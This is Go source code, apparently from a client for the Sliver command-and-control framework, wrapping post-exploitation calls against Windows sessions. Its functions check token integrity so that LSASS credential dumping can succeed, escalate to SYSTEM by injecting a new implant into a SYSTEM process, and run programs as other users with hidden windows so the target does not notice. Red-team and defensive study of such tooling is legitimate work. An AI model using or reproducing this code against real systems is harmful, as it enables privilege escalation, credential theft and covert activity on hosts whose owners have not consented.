package sliver

import (
	"context"
	"errors"
	"fmt"
	"strings"
	"time"

	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
)

// WindowsPrivilegeView is the JSON shape of a Windows privilege entry.
type WindowsPrivilegeView struct {
	Name             string `json:"Name"`
	Description      string `json:"Description"`
	Enabled          bool   `json:"Enabled"`
	EnabledByDefault bool   `json:"EnabledByDefault"`
	Removed          bool   `json:"Removed"`
	UsedForAccess    bool   `json:"UsedForAccess"`
}

func privilegeToView(p *sliverpb.WindowsPrivilegeEntry) WindowsPrivilegeView {
	v := WindowsPrivilegeView{}
	if p == nil {
		return v
	}
	v.Name = p.Name
	v.Description = p.Description
	v.Enabled = p.Enabled
	v.EnabledByDefault = p.EnabledByDefault
	v.Removed = p.Removed
	v.UsedForAccess = p.UsedForAccess
	return v
}

// GetPrivs lists the privilege information of the session's process.
func (c *Client) GetPrivs(sessionID string) ([]WindowsPrivilegeView, error) {
	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
	defer cancel()
	resp, err := c.RPC.GetPrivs(ctx, &sliverpb.GetPrivsReq{
		Request: &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return nil, err
	}
	if resp.GetResponse().GetErr() != "" {
		return nil, errors.New(resp.GetResponse().GetErr())
	}
	out := make([]WindowsPrivilegeView, 0, len(resp.PrivInfo))
	for _, p := range resp.PrivInfo {
		out = append(out, privilegeToView(p))
	}
	return out, nil
}

// SessionIntegrity reports the integrity level of the session's token: one of
// Untrusted, Low, Medium or High.
//
// This is what decides whether the credential-dumping modules can work at all.
// sekurlsa reads live logon sessions out of LSASS, and opening LSASS needs
// SeDebugPrivilege, which a medium-integrity token does not hold. The failure
// surfaces as an access-denied from deep inside the tool
// ("kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)"), so checking
// the level first is what turns that into "this session is not elevated".
//
// Sliver only answers this on Windows: MsgGetPrivsReq has no handler elsewhere.
func (c *Client) SessionIntegrity(sessionID string) (string, error) {
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	resp, err := c.RPC.GetPrivs(ctx, &sliverpb.GetPrivsReq{
		Request: requestFor(sessionID, 30*time.Second),
	})
	if err != nil {
		return "", err
	}
	if resp.GetResponse().GetErr() != "" {
		return "", errors.New(resp.GetResponse().GetErr())
	}
	return resp.ProcessIntegrity, nil
}

// IsElevatedIntegrity reports whether an integrity level is high enough for the
// LSA-reading modules. Sliver reports "High" for an elevated administrator token
// and for a SYSTEM token alike, so one comparison covers both.
func IsElevatedIntegrity(level string) bool {
	return strings.EqualFold(strings.TrimSpace(level), "High")
}

// elevationPollInterval is how often ElevateToSystem re-reads the session list
// while waiting for the injected implant to check in.
const elevationPollInterval = time.Second

// ElevateToSystem runs sliver's GetSystem and waits for the SYSTEM implant it
// spawns to register, returning the new session's ID.
//
// GetSystem does not elevate the current session. It generates a second implant
// and injects it into a SYSTEM-owned process, so the result is a NEW session at
// high integrity while the original stays exactly as it was. Callers therefore
// have to switch to the returned session: running the operation on the original
// would reproduce the same access-denied.
//
// The session list is snapshotted first so the new session can be identified.
// Matching on hostname instead would pick up any other session on the same host,
// including the unelevated one this call is trying to get away from.
func (c *Client) ElevateToSystem(sessionID, hostingProcess string, wait time.Duration) (string, error) {
	before, err := c.Sessions()
	if err != nil {
		return "", fmt.Errorf("cannot snapshot sessions before escalating: %w", err)
	}
	seen := make(map[string]bool, len(before))
	for _, s := range before {
		seen[s.ID] = true
	}

	if err := c.GetSystem(sessionID, hostingProcess); err != nil {
		return "", err
	}

	deadline := time.Now().Add(wait)
	for time.Now().Before(deadline) {
		time.Sleep(elevationPollInterval)
		sessions, err := c.Sessions()
		if err != nil {
			// A transient failure here is not fatal: the implant may still be
			// starting, and the next poll can succeed.
			continue
		}
		for _, s := range sessions {
			if !seen[s.ID] && !s.IsDead {
				return s.ID, nil
			}
		}
	}
	return "", fmt.Errorf("GetSystem succeeded but the SYSTEM implant did not check in within %s", wait)
}

// CurrentTokenOwner retrieves the owner of the session's thread token.
func (c *Client) CurrentTokenOwner(sessionID string) (string, error) {
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	resp, err := c.RPC.CurrentTokenOwner(ctx, &sliverpb.CurrentTokenOwnerReq{
		Request: &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return "", err
	}
	if resp.GetResponse().GetErr() != "" {
		return "", errors.New(resp.GetResponse().GetErr())
	}
	return resp.Output, nil
}

// ExecuteToken executes a program in the context of the session's token.
// Note: the ExecuteToken RPC was removed from sliver-server; use MakeToken +
// impersonation instead. Returns a clear error so the frontend surfaces it.
func (c *Client) ExecuteToken(sessionID, path string, args []string, output bool) (*ExecResult, error) {
	return nil, errors.New("ExecuteToken is not supported by the connected sliver-server version")
}

// RunAs runs a program as a specific user on the session.
//
// HideWindow is set for the same reason execOn sets it: the implant maps it to
// the STARTUPINFO show flag (handlers_windows.go: runAsHandler), and without it
// the process this starts appears on the target's desktop as a console window.
// RunAs is used to reach a different user's context, so a window here is both a
// giveaway and a visible artefact attributed to the wrong account.
func (c *Client) RunAs(sessionID, username, processName, args string) (string, bool, error) {
	ctx, cancel := context.WithTimeout(context.Background(), execDefaultTimeout)
	defer cancel()
	resp, err := c.RPC.RunAs(ctx, &sliverpb.RunAsReq{
		Username:    username,
		ProcessName: processName,
		Args:        args,
		HideWindow:  true,
		Request:     requestFor(sessionID, execDefaultTimeout),
	})
	if err != nil {
		return "", false, err
	}
	if resp.GetResponse().GetErr() != "" {
		return "", false, errors.New(resp.GetResponse().GetErr())
	}
	return resp.Output, resp.GetResponse().GetAsync(), nil
}
